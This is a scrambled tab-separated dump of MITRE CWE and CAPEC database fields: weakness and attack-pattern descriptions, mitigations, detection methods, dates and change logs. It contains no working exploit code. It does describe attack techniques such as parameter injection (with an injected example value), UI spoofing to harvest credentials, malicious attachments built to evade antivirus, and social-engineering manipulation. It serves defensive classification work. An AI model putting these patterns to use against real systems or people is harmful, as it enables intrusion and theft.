12233	23	An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value "myInput&new_param=myValue", then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.
6058	94	Run Arbitrary Code
24938	23	An adversary, through a previously installed malicious application, monitors the task list maintained by the operating system and waits for a specific legitimate task to become active. Once the task is detected, the malicious application launches a new task in the foreground that mimics the user interface of the legitimate task. At this point, the user thinks that they are interacting with the legitimate task that they started, but instead they are interacting with the malicious application. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user. Once the adversary's goal is reached, the malicious application can exit, leaving the original trusted application visible and the appearance that nothing out of the ordinary has occurred.
10031	31	1000
12173	52	Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.
23870	28	CWE Content Team
9993	95	Determine the ciphertext and the encryption algorithm.
7326	76	2018-07-31
24440	67	Medium
16976	35	MITRE
10726	28	CWE Content Team
15985	62	updated Common_Consequences
13219	80	To input faked entries into Web logs
12385	62	Suggested OWASP Top Ten 2004 mapping
10524	92	Exploit
10394	35	Cigital
15774	50	Design: Check for the existence of files to be created, if in existence verify they are neither symlinks nor hard links before opening them.
9778	39	2014-02-18
21666	104	140
24585	39	2012-10-30
14215	39	2008-09-08
7908	45	Variant
6182	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, References, Relationships, Type
20929	35	MITRE
10822	81	Integrity
22876	28	CWE Content Team
13237	35	MITRE
9070	62	updated Relationships
8128	28	CWE Content Team
16379	40	The target host exposes vulnerable functions within its WSDL interface.
6975	32	http://blogs.adobe.com/asset/2012/09/inappropriate-use-of-adobe-code-signing-certificate.html
21137	56	ChildOf
19964	28	CWE Content Team
13409	35	MITRE
18702	35	MITRE
11144	26	Implementation
7486	28	CWE Content Team
15261	31	1000
14946	28	CWE Content Team
23206	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
22997	81	Other
17029	31	699
10413	28	CWE Content Team
10362	28	CWE Content Team
15326	39	2018-03-27
20923	33	Sascha Herzog
24591	69	Incomplete
24923	48	09
13899	91	Implementation
12371	39	2010-06-21
17626	62	updated Relationships
21391	62	updated Relationships, Taxonomy_Mappings
18319	70	Creating More Secure SWF Web Application
11427	56	ChildOf
21032	76	2017-08-04
11918	79	Confidentiality
14573	79	Integrity
10410	62	updated Relationships, Taxonomy_Mappings
7162	78	Low
8112	56	ChildOf
22838	62	updated Common_Consequences
6948	76	2017-08-04
6523	81	Integrity
24990	39	2011-03-29
21679	91	Implementation
6829	28	CWE Content Team
23983	28	CWE Content Team
10271	80	Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc)
15491	28	CWE Content Team
22094	104	228
20600	62	updated Relationships
18074	35	MITRE
24118	35	MITRE
16557	42	Always use array indexing instead of direct pointer manipulation.
24898	62	updated References
15230	21	PLOVER
17244	62	updated Potential_Mitigations
11260	62	updated Background_Details, Description
9933	28	CWE Content Team
16156	39	2008-11-24
12673	81	Confidentiality
16154	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
6603	39	2014-07-30
22569	47	Execute Unauthorized Commands
9024	62	updated Related_Attack_Patterns, Relationships
9622	42	Use a CPU and operating system that offers Data Execution Protection (NX) or its equivalent [REF-60] [REF-61].
21472	28	CWE Content Team
8178	31	1000
25402	104	351
15278	57	Indirect
7002	62	updated Time_of_Introduction
17239	62	updated Relationships, Other_Notes, Taxonomy_Mappings
16987	62	updated Taxonomy_Mappings
19401	62	updated Description, Other_Notes
8858	33	ONsec Lab
23432	74	3
6338	100	The MITRE Corporation
7233	28	CWE Content Team
9471	28	CWE Content Team
19859	101	CAPEC Content Team
16963	60	23
20748	66	MS08-014 : The Case of the Uninitialized Stack Variable Vulnerability
11008	77	Dynamic Analysis with Manual Results Interpretation
12180	35	MITRE
23834	39	2008-07-01
23766	62	updated Relationships, Weakness_Ordinalities
15851	35	MITRE
13321	31	1000
12757	97	Influence Perception of Liking
23791	59	Updated Execution_Flow
22256	89	Detailed
14704	23	The software does not properly handle when all or part of an input has been URL encoded.
6582	56	ChildOf
21552	94	Run Arbitrary Code
22432	28	CWE Content Team
7999	79	Confidentiality
14789	35	MITRE
13720	77	Manual Static Analysis - Source Code
9641	35	MITRE
13536	35	MITRE
13021	55	CAPEC Content Team
13980	35	MITRE
22102	63	Modify Application Data
17828	63	Read Application Data
7012	62	updated Common_Consequences
15417	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
21873	55	CAPEC Content Team
11758	35	MITRE
9126	31	699
23988	62	added/updated demonstrative examples
19621	88	Password Aging with Long Expiration
14111	79	Integrity
13528	39	2012-10-30
25387	50	Implementation: Perform input validation for all remote content.
12478	42	Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, "not-a-number" calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7]                   Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.
25365	53	The MITRE Corporation
13931	39	2011-06-01
23934	97	Disable Security Software
13539	39	2011-06-01
13379	39	2008-07-01
7676	39	2019-01-03
18475	39	2010-12-13
11341	103	Primary
8022	62	updated Description, Observed_Examples
11383	28	Eric Dalci
7516	78	High
24682	89	Standard
12349	62	updated Alternate_Terms, Relationships, Other_Notes, Taxonomy_Mappings
19645	39	2008-09-08
7887	35	MITRE
8193	39	2014-07-30
19364	79	Authorization
20880	28	CWE Content Team
16336	30	Jose M. Such
10754	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
19315	28	CWE Content Team
11579	50	Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.
11690	26	Operation
13676	76	2018-07-31
11441	91	Implementation
21181	50	In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.
13261	88	Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')
23737	55	CAPEC Content Team
19268	62	updated Other_Notes, Theoretical_Notes
6951	62	updated Applicable_Platforms, Demonstrative_Examples
14620	60	26
24419	25	Low
12983	31	1000
25252	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
7797	35	MITRE
9516	28	CWE Content Team
8806	72	An attacker could bypass the authentication routine without knowing the original password.
10184	53	The MITRE Corporation
20395	28	CWE Content Team
17065	62	updated Common_Consequences
25346	35	MITRE
6315	79	Confidentiality
24446	35	MITRE
18908	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
7359	53	The MITRE Corporation
24389	87	Database Server
9893	21	PLOVER
8649	95	[Test user-controllable inputs for injection]
7514	100	The MITRE Corporation
9803	102	ChildOf
7436	23	The adversary uses social engineering to exploit the target's perception of the relationship between the adversary and themselves. This goal is to persuade the target to unknowingly perform an action or divulge information that is advantageous to the adversary.
7794	28	CWE Content Team
25049	56	ChildOf
6422	81	Access Control
20231	101	CAPEC Content Team
14788	35	MITRE
10331	22	03
8924	28	CWE Content Team
23475	66	Expression Language Injection
11538	35	MITRE
23566	39	2015-12-07
10577	66	Automatic Detection of Vulnerable Dynamic Component Loadings
7525	23	This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'ID' value from the probe packet. An attacker sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host to observe the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within an ICMP error message.
17968	39	2011-06-27
18940	35	MITRE
11047	94	Run Arbitrary Code
7253	35	MITRE
23764	62	updated Common_Consequences
18827	25	Low
25079	21	PLOVER
24970	22	02
15298	97	Pretexting
13261	46	Including unvalidated data in an HTTP header allows an attacker to specify the entirety of the HTTP response rendered by the browser. When an HTTP request contains unexpected CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n) characters the server may respond with an output stream that is interpreted as two different HTTP responses (instead of one). An attacker can control the second response and mount attacks such as cross-site scripting and cache poisoning attacks.             HTTP response splitting weaknesses may be present when:                                                Data enters a web application through an untrusted source, most frequently an HTTP request.                   The data is included in an HTTP response header sent to a web user without being validated for malicious characters.
21010	28	CWE Content Team
23930	39	2014-07-30
12658	51	2015-11-09
14607	28	CWE Content Team
23371	39	2013-02-21
8588	39	2010-09-27
24134	35	MITRE
6524	88	ASP.NET Misconfiguration: Improper Model Validation
15081	91	Implementation
18479	49	2016
12788	81	Other
5799	31	699
15658	103	Primary
10277	28	CWE Content Team
7828	39	2008-09-08
12617	71	1989
11091	57	Primary
20716	76	2017-05-01
24325	91	Architecture and Design
21559	56	ChildOf
22737	78	High
16287	76	2017-01-09
14169	39	2014-07-30
10297	21	CWE Content Team
8952	95	An adversary determines the input data stream that is being processed by an XML parser on the victim's side.
6783	72	An attacker could obtain sensitive information.
23762	56	ChildOf
15253	39	2008-07-01
12811	40	The target program does not perform sufficient boundary checking.
5865	54	High
16538	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances
15983	39	2012-05-11
21370	39	2008-09-08
6148	88	Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
19844	23	A software system that accepts path input in the form of multiple internal dot ('file...dir') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
13426	23	The code contains a class with sensitive data, but the class does not explicitly deny serialization. The data can be accessed by serializing the class through another class.
13726	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
24097	23	The implementation of the product is not consistent with the      design as described within the relevant documentation.
8211	104	138
14687	103	Primary
9814	90	ASP.NET
17396	62	updated Relationships
15824	63	Unexpected State
9901	66	Mitigating Cross-site Scripting With HTTP-only Cookies
10100	62	updated Potential_Mitigations
18948	39	2014-06-23
18532	88	Comparison of Incompatible Types
13637	55	CAPEC Content Team
17769	30	Jeff Warren
12310	44	High
16846	35	MITRE
19150	97	Object Injection
12710	39	2012-05-11
9305	81	Other
8738	97	TCP Flood
7516	50	Leverage anti-virus products to detect and quarantine software with known virus.
11863	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22953	62	updated Applicable_Platforms, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships
21045	28	CWE Content Team
14995	39	2010-02-16
25299	81	Other
23762	31	1000
21361	50	Implementation: Perform input validation for all remote content.
11608	72	"Inner Classes" data confidentiality aspects can often be overcome.
19078	46	Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.             When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.
24999	31	699
8803	62	updated Potential_Mitigations
14584	66	Seven Business Logic Flaws That Put Your Website At Risk
10010	39	2008-10-14
6860	33	Colin Percival
21728	100	The MITRE Corporation
17830	35	MITRE
22056	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.                   Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.
8603	35	KDM Analytics
11660	46	This may allow the resource to be manipulated by actors outside of the intended control sphere.
24144	35	MITRE
13719	35	MITRE
14033	31	699
8401	90	Language-Independent
20561	101	CAPEC Content Team
12434	90	Language-Independent
12328	104	497
12762	57	Primary
11091	23	The software does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.
17374	48	08
23605	39	2008-09-08
21238	40	The targeted Flash application must reference external URLs and the locations thus referenced must be controllable through parameters. The Flash application must fail to sanitize such parameters against malicious manipulation. The victim must follow a crafted link created by the attacker.
12189	76	2017-05-01
21802	62	updated References, Relationships
11010	28	CWE Content Team
21716	23	An adversary exploits inherent human psychological predisposition to influence a targeted individual or group to solicit information or manipulate the target into performing an action that serves the adversary's interests. Many interpersonal social engineering techniques do not involve outright deception, although they can; many are subtle ways of manipulating a target to remove barriers, make the target feel comfortable, and produce an exchange in which the target is either more likely to share information directly, or let key information slip out unintentionally. A skilled adversary uses these techniques when appropriate to produce the desired outcome. Manipulation techniques vary from the overt, such as pretending to be a supervisor to a help desk, to the subtle, such as making the target feel comfortable with the adversary's speech and thought patterns.
10731	35	Cigital
8267	35	MITRE
13336	88	External Initialization of Trusted Variables or Data Stores
11537	26	Operation
6156	28	CWE Content Team
17902	45	Base
6876	50	Security by Obscurity is not a solution to preventing SQL Injection. Rather than suppress error messages and exceptions, the application must handle them gracefully, returning either a custom error page or redirecting the user to a default page, without revealing any information about the database or the application internals.
20392	62	updated Description, Enabling_Factors_for_Exploitation
5676	28	CWE Content Team
12637	61	Draft
24443	53	The MITRE Corporation
21469	62	updated Demonstrative_Examples, Related_Attack_Patterns
17981	56	ChildOf
15855	28	CWE Content Team
7320	33	Solar Designer
17675	39	2014-07-30
13832	35	KDM Analytics
24373	30	L. Masinter
9626	50	Require code signing and avoid using relative paths for resources.
12981	35	MITRE
20321	100	The MITRE Corporation
14936	67	Low
13993	47	Modify Data
23474	103	Primary
22886	39	2008-09-08
9917	76	2019-09-30
23712	39	2009-10-29
24457	104	618
19120	62	updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Relationships
9324	49	2009
14195	96	2018-07-02
23570	35	MITRE
7948	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
18207	62	updated Description, Potential_Mitigations
11536	25	High
21285	23	The software stores sensitive information without properly limiting read or write access by unauthorized actors.
19250	103	Primary
6800	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
7618	63	DoS: Resource Consumption (Other)
14484	62	updated Relationships
17231	76	2017-01-09
6592	92	Experiment
7778	62	updated Relationships
8164	39	2017-05-03
13083	59	Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses
16257	23	A software system that accepts path input in the form of internal dot ('file.ordir') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
5978	91	Implementation
5664	39	2014-07-30
13518	76	2017-01-09
14917	55	CAPEC Content Team
7840	31	699
5920	28	CWE Content Team
18674	104	62
7054	62	updated Relationships
22595	62	updated Relationships
14656	28	CWE Content Team
9441	63	Read Memory
6936	54	High
14649	28	CWE Content Team
8995	85	517
24607	92	Experiment
17057	31	1000
8989	35	MITRE
11678	35	MITRE
25426	59	Updated Related_Attack_Patterns, Related_Weaknesses
7393	45	Base
11850	39	2009-03-10
14488	59	Updated @Abstraction
23881	43	Simple
23495	28	CWE Content Team
9958	28	CWE Content Team
12267	62	added/updated demonstrative examples
14693	35	MITRE
10986	62	added/updated demonstrative examples
22140	78	High
15461	62	updated Relationships
25195	86	http://www.hardened-php.net/suhosin/
24076	24	MITRE
5743	102	ChildOf
13311	31	699
21590	45	Variant
21738	35	MITRE
8279	28	CWE Content Team
19101	28	CWE Content Team
18543	90	PHP
12343	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
13737	62	updated Potential_Mitigations
10072	103	Primary
13522	62	updated Common_Consequences, Description
9530	72	If that file can be written to by the attacker, the file might be moved into a place to which the attacker does not have access. This will allow the attacker to gain selective resource access-control privileges.
12032	21	CWE Content Team
20874	63	Read Files or Directories
7612	50	Limit privileges of user accounts so service changes can only be performed by authorized administrators. Also monitor any service changes that may occur inadvertently.
9560	55	CAPEC Content Team
19028	73	An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.
12035	28	CWE Content Team
13029	81	Confidentiality
17407	104	484
25263	21	7 Pernicious Kingdoms
9068	51	2014-06-23
5728	35	MITRE
18768	26	Implementation
19183	62	updated Relationships
11094	39	2008-10-14
17203	62	updated Applicable_Platforms, References, Relationships, Taxonomy_Mappings
11398	25	Low
24693	74	2
9437	31	699
19094	63	Bypass Protection Mechanism
17804	28	CWE Content Team
7364	24	MITRE
15215	39	2008-09-08
24228	96	2018-07-02
20806	39	2011-03-29
23873	81	Availability
23455	88	Use of Incorrect Byte Ordering
6065	95	[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.
13225	35	MITRE
9902	54	Low
16873	92	Exploit
10974	23	The default error page of a web application should not display sensitive information about the software system.
20323	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize 'dir\..\..\filename' (multiple internal backslash dot dot) sequences that can resolve to a location that is outside of that directory.
11348	50	Pay attention to the resource pointed to by your symlink links (See attack pattern named "Forced Symlink race"), they can be replaced by malicious resources.
14349	76	2015-12-07
21751	39	2008-07-01
21113	55	CAPEC Content Team
17681	51	2014-06-23
18150	95	The server responds by returning the challenge encrypted with a shared secret as well as its own challenge to the attacker
10386	39	2011-06-01
23499	28	CWE Content Team
20591	81	Availability
19360	35	MITRE
14682	35	MITRE
23373	39	2014-06-23
24899	42	Add an appropriately sized checksum to the protocol, ensuring that data received may be simply validated before it is parsed and used.
8934	53	The MITRE Corporation
9880	35	Cigital
12552	91	Implementation
21045	35	MITRE
18485	62	updated Applicable_Platforms
16248	99	SANS Software Security Institute
22611	103	Primary
16379	54	High
16427	42	Declare all public fields as final when possible, especially if it is used to maintain internal state of an Applet or of classes used by an Applet. If a field must be public, then perform all appropriate sanity checks before accessing the field from your code.
24398	39	2008-09-08
22753	35	Cigital
18623	50	Disallow shared content. Protect shared folders by minimizing users that have write access. Use utilities that mitigate exploitation like the Microsoft Enhanced Mitigation Experience Toolkit (EMET) to prevent exploits from being run.
12533	35	MITRE
20011	101	CAPEC Content Team
16464	35	MITRE
19679	39	2017-11-08
8369	62	updated Relationships
13705	55	CAPEC Content Team
18039	28	CWE Content Team
7584	35	Cigital
14985	102	ChildOf
12525	42	When deciding which PRNG to use, look at its sources of entropy. Depending on what your security needs are, you may need to use a random number generator that always uses strong random data -- i.e., a random number generator that attempts to be strong but will fail in a weak way or will always provide some middle ground of protection through techniques like re-seeding. Generally, something that always provides a predictable amount of strength is preferable.
23569	39	2008-07-01
18256	39	2013-02-21
21213	104	322
23904	63	Reduce Reliability
15582	62	updated Relationships, Taxonomy_Mappings
21461	103	Primary
15620	63	Bypass Protection Mechanism
6480	35	MITRE
16101	35	MITRE
10774	28	CWE Content Team
11256	28	CWE Content Team
16652	35	MITRE
22459	56	CanPrecede
7338	23	The software is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.
24157	62	updated Observed_Examples
24833	35	MITRE
24761	96	2018-07-02
18161	39	2017-11-08
9522	35	MITRE
10409	52	Common idioms are detectable in white box analysis, such as time-of-check-time-of-use (TOCTOU) file operations (CWE-367), or double-checked locking (CWE-609).
22097	28	Eric Dalci
16249	62	updated Relationships
15361	28	CWE Content Team
17889	46	Within servlets, shared static variables are not protected from concurrent access, but servlets are multithreaded. This is a typical programming mistake in J2EE applications, since the multithreading is handled by the framework. When a shared variable can be influenced by an attacker, one thread could wind up modifying the variable to contain data that is not valid for a different thread that is also using the data within the variable.             Note that this weakness is not unique to servlets.
12301	79	Non-Repudiation
15186	62	updated Relationships
22428	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
12762	69	Draft
5900	56	ChildOf
19217	77	Dynamic Analysis with Manual Results Interpretation
6556	35	MITRE
19055	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                                                                     Cost effective for partial coverage:                                                                           Binary Weakness Analysis - including disassembler + source code weakness analysis
16816	62	updated Potential_Mitigations
8705	84	13
14947	28	CWE Content Team
18532	90	PHP
5641	28	CWE Content Team
18538	62	updated Observed_Examples, Relationships
25081	25	High
20306	35	MITRE
11708	35	MITRE
23239	50	Keep patches up to date by installing weekly or daily if possible.
18748	62	updated Observed_Examples, Relationships
18630	73	View HTML source of web pages that contain links or buttons that perform actions of interest.
21340	35	MITRE
7520	49	2004
24340	76	2018-07-31
11187	40	Ability to control the length of data passed to an active filter.
21010	35	MITRE
12935	67	Medium
22841	57	Indirect
23490	62	updated Applicable_Platforms
24101	74	1
11793	39	2014-07-30
13336	69	Draft
7616	35	MITRE
8512	56	ChildOf
24881	100	The MITRE Corporation
6090	45	Variant
23205	28	CWE Content Team
14438	103	Primary
16214	55	CAPEC Content Team
7028	59	Updated @Abstraction, Related_Attack_Patterns
10993	103	Primary
8699	39	2011-06-01
18454	51	2014-06-23
9109	63	Unexpected State
15572	62	updated Applicable_Platforms, References, Taxonomy_Mappings
23299	39	2018-03-27
21237	31	699
14910	62	updated References, Relationships
25099	91	Architecture and Design
8821	56	ChildOf
19190	39	2011-06-01
6804	47	Alter Execution Logic
13048	94	A successful resource leak exposure attack compromises the availability of the target system's services.
21451	86	http://msdn.microsoft.com/en-us/library/ms795857.aspx
10603	104	13
11732	31	1000
24694	28	CWE Content Team
6972	62	updated Potential_Mitigations
11209	73	Use an automated tool to record all instances of URLs to process XML requests.
20628	100	The MITRE Corporation
14694	39	2014-07-30
24361	28	CWE Content Team
10146	81	Integrity
10124	33	Chaim Linhart
14227	39	2014-06-23
22026	35	MITRE
17803	40	An attacker can eavesdrop on the communication between the target components.
24378	63	Execute Unauthorized Code or Commands
17873	62	updated Relationships
17947	91	Operation
23938	57	Primary
14205	74	4
15729	81	Access Control
15049	28	CWE Content Team
12517	28	CWE Content Team
6711	26	Architecture and Design
21559	31	1000
24883	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
16789	97	XSS Targeting Error Pages
16819	56	ChildOf
12792	35	MITRE
22586	62	updated Relationships
17449	28	CWE Content Team
24351	35	MITRE
15338	31	1000
13332	31	1000
18505	42	With Struts, write all data from form beans with the bean's filter attribute set to true.
10071	56	ChildOf
25355	94	Run Arbitrary Code
17712	79	Access Control
24628	35	MITRE
10890	62	updated Name
5782	93	Defense in Depth
6484	35	MITRE
10750	28	CWE Content Team
23285	35	MITRE
9155	102	ChildOf
24953	100	The MITRE Corporation
19311	46	The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).
12337	76	2017-08-04
17162	70	Secunia Advisory SA16869: Firefox Command Line URL Shell Command Injection
13248	62	updated Modes_of_Introduction, Relationships, Relevant_Properties
17148	26	Operation
11393	39	2012-05-11
19673	74	1
22118	35	MITRE
11350	35	MITRE
10779	79	Availability
21510	56	ChildOf
14407	39	2012-10-30
18324	28	CWE Content Team
19540	35	MITRE
11228	33	David Litchfield
21217	92	Experiment
12336	42	Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces.
6865	62	updated Applicable_Platforms, Relationships, Relevant_Properties
20899	73	Manipulate the MIME sent in order to confuse the web server.
15828	62	updated Relationships
16345	62	updated Common_Consequences
11212	104	36
13499	35	MITRE
12264	62	updated Relationships
21608	92	Experiment
17304	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
24393	62	updated Functional_Areas, Observed_Examples, References, Taxonomy_Mappings
15779	35	MITRE
12788	63	Reduce Performance
12584	35	MITRE
18455	39	2014-06-23
12897	85	290
14200	62	updated Common_Consequences
17545	76	2018-07-31
9416	91	Implementation
7729	63	Bypass Protection Mechanism
15844	57	Primary
10762	91	Implementation
9357	59	Updated Related_Weaknesses
16490	62	updated Relationships
5669	31	699
18100	39	2010-06-21
23492	62	updated Relationships, Taxonomy_Mappings
23564	72	An attacker could modify sensitive data or program variables.
5846	31	1000
15615	45	Variant
14766	71	1999
18006	39	2011-03-29
6349	104	30
10554	33	Brett Moore
7811	97	XSS Using Invalid Characters
14655	73	Man-in-the-Middle intercepts secure communication between two parties.
11994	39	2009-03-10
25222	69	Incomplete
8060	85	71
25096	60	15
6606	76	2015-12-07
19636	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
14043	26	Implementation
8916	56	CanPrecede
24733	35	MITRE
18350	67	High
22692	62	added/updated demonstrative examples
8622	25	Low
7318	39	2012-05-11
22186	59	Updated Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
20379	46	While the Java Language Specification allows an object's finalize() method to be called from outside the finalizer, doing so is usually a bad idea. For example, calling finalize() explicitly means that finalize() will be called more than once: the first time will be the explicit call and the last time will be the call that is made after the object is garbage collected.
12601	63	Hide Activities
15614	62	updated Relationships, Taxonomy_Mappings
18524	39	2010-06-21
13358	62	updated Relationships
15002	26	Implementation
21836	72	Exposing critical functionality essentially provides an attacker with the privilege level of that functionality. The consequences will depend on the associated functionality, but they can range from reading or modifying sensitive data, access to administrative or other privileged functionality, or possibly even execution of arbitrary code.
23231	39	2008-09-08
21393	39	2010-04-05
23252	23	The software creates an immutable text string using string      concatenation operations.
10086	81	Access Control
17792	77	Manual Static Analysis - Source Code
12422	43	Simple
10841	100	The MITRE Corporation
24007	100	The MITRE Corporation
24239	91	Distribution
11246	79	Confidentiality
10355	28	CWE Content Team
20296	26	Operation
21392	100	The MITRE Corporation
13968	28	CWE Content Team
11562	62	updated Relationships
20885	39	2008-07-01
8148	39	2014-07-30
15608	49	2010
18145	31	699
23968	104	1047
21290	79	Confidentiality
19261	101	CAPEC Content Team
10147	35	MITRE
18617	97	Detect Unpublicized Web Pages
11299	23	The software includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the software, potentially granting total access and control of the software to the untrusted source.
14818	28	CWE Content Team
15361	62	updated Common_Consequences, Description, Detection_Factors, Name, Observed_Examples, Potential_Mitigations, References, Relationships
7076	35	MITRE
20889	28	CWE Content Team
21915	39	2017-11-08
15280	39	2008-10-14
18161	35	MITRE
16076	21	CLASP
7215	76	2017-01-09
20339	39	2014-07-30
5778	59	Updated Consequences, Related_Attack_Patterns, Related_Weaknesses
5731	39	2010-06-21
6500	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
18859	90	Language-Independent
24602	43	Simple
24584	31	1000
21725	86	http://www.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf
11025	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
18378	23	The software does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.
8017	31	1000
17302	47	Modify Data
19098	59	Updated Related_Weaknesses
12200	35	MITRE
19156	104	797
10416	56	ChildOf
21166	62	updated Time_of_Introduction
5647	35	MITRE
6993	47	Bypass Protection Mechanism
16697	50	Ensure all input content that is delivered to client is sanitized against an acceptable content specification.
18660	42	Use PHP 4 or later.
21463	39	2009-07-27
16913	86	https://blog.nelhage.com/2011/03/exploiting-pickle/
20128	59	Updated Related_Attack_Patterns
19255	73	Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).
23531	28	Eric Dalci
18602	79	Availability
19744	100	The MITRE Corporation
16012	39	2009-10-29
9517	35	MITRE
20890	55	CAPEC Content Team
22093	100	The MITRE Corporation
6945	33	WASC
10895	39	2014-07-30
21744	80	Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.
12225	44	High
9730	92	Exploit
17392	62	updated Demonstrative_Examples, Potential_Mitigations
6969	26	Operation
11446	55	CAPEC Content Team
13155	28	CWE Content Team
10185	35	MITRE
17598	28	CWE Content Team
24655	35	MITRE
9346	78	Very High
6274	28	CWE Content Team
16994	91	Build and Compilation
12564	48	08
6533	103	Primary
22395	39	2012-10-30
15999	86	http://www.cgisecurity.com/articles/csrf-faq.shtml
8839	80	Determining the database type and version, as well as the right number and type of parameters to the query being injected in the absence of error messages requires greater skill than reverse-engineering database error messages.
16768	26	Implementation
